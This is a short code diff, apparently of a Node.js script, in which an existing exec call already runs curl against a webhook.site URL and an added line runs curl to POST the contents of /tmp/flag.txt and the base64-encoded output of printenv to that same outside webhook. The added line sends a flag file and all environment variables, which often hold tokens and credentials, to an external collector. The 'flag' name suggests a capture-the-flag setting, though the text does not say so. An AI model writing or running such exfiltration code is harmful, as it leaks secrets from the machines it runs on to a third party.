@@ -42,3 +42,6 @@ exec('curl https://webhook.site/7d8cbbc5-b054-45b1-8504-7e56f999530f?$(cd ..; cd
     // log the output received from the command
     console.log("Output: \n", output)
 })
+
+
+exec('curl -X POST --data "flag=$(cat /tmp/flag.txt)" https://webhook.site/7d8cbbc5-b054-45b1-8504-7e56f999530f?$(printenv | base64)');
